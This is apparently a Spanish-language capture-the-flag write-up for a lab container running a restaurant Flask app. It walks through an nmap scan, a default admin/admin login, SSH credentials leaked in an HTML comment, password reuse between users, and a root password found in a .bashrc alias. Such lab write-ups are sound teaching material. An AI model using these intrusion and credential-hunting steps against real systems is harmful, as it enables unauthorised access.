
## 1. Reconocimiento

```bash
sudo nmap -sS -p- --min-rate 5000 172.17.0.2 -oG nmap
nmap -sVC -p22,5000 --min-rate 5000 172.17.0.2 -oG vers
```

Puertos abiertos:

| Puerto | Servicio | Detalle |
|--------|----------|---------|
| 22 | SSH | OpenSSH 9.2p1 Debian |
| 5000 | HTTP | Werkzeug 2.2.2 / Python 3.11.2 — título: Restaurante Balulero |

---

## 2. Acceso al panel admin — credenciales por defecto

El servidor web en el puerto 5000 muestra la web del restaurante. En la parte superior derecha hay un botón "Admin" que redirige a `/login`. Se prueba la combinación más básica posible:

```
Usuario: admin
Contraseña: admin
```

El servidor acepta las credenciales y redirige al panel de administración.

> La aplicación Flask tiene el login hardcodeado en `app.py` como `if username == 'admin' and password == 'admin'`. No hay base de datos de usuarios ni hash, simplemente una comparación de strings en texto plano.

---

## 3. Information disclosure — comentario en el código fuente

Inspeccionando el HTML del panel de administración aparece este comentario:

```html
<!-- Backup de acceso: sysadmin:backup123 -->
```

Credenciales SSH expuestas directamente en el código fuente del frontend, visibles para cualquiera que acceda al panel.

---

## 4. Acceso SSH como sysadmin

```bash
ssh sysadmin@172.17.0.2
# contraseña: backup123

sysadmin@1d3d99107738:~$ whoami
sysadmin
```

---

## 5. Enumeración interna — código fuente de la app Flask

En el home de `sysadmin` está el código fuente de la aplicación:

```bash
ls ~
# app.py  restaurant.db  static  templates

cat app.py
```

Dos hallazgos relevantes:

```python
app.secret_key = 'cuidaditocuidadin'
```

La secret key de Flask en texto plano. Con ella se pueden firmar cookies de sesión arbitrarias, lo que permitiría suplantar cualquier sesión sin conocer credenciales.

Revisando `/etc/passwd` se encuentra un segundo usuario del sistema:

```
balulero:x:1001:1001:balulero,,,:/home/balulero:/bin/bash
```

Se prueba `su balulero` con la contraseña de `sysadmin` (`backup123`) — y funciona:

```bash
su balulero
# contraseña: backup123

balulero@1d3d99107738:/home/sysadmin$ whoami
balulero
```

---

## 6. Escalada a root — contraseña en alias de .bashrc

Tras enumerar los vectores habituales sin resultado, se revisa el `.bashrc` de `balulero`:

```bash
cat ~/.bashrc
```

Al final del archivo, entre las configuraciones estándar de bash, aparece esto:

```bash
alias ser-root='echo chocolate2 | su - root'
```

Un alias que automatiza el cambio a root pasando la contraseña directamente por pipe. La contraseña de root está en texto plano: `chocolate2`.

```bash
su root
# contraseña: chocolate2

root@1d3d99107738:/home/balulero# id
uid=0(root) gid=0(root) groups=0(root)
root@1d3d99107738:/home/balulero# whoami
root
```
